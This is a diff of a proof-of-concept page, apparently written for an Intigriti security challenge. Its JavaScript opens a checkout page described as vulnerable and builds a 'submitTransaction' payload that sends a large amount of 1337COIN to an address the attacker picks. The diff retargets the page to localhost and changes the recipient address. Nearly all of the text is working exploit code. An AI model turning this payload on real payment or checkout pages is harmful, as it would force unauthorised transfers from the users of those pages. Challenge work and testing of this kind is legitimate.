@@ -14,14 +14,14 @@
     //<![CDATA[
         document.getElementById('start').addEventListener('click', function () {
             // 1. Open the vulnerable checkout page
-            var checkoutWindow = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000', 'checkout');
+            var checkoutWindow = window.open('http://localhost/checkout.html?currency=1337COIN&price=1000000', 'checkout');
 
             // 2. Wait for the window to load (using a timeout as a fallback for cross-origin restrictions)
             setTimeout(function() {
                 var payload = {
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: `16b8e150e69de9df6aa7c4b28a4f0dafaa`,
+                        toAddress: `kavilaoa`,
                         currency: '1337COIN',
                         amount: 13355666
                     }
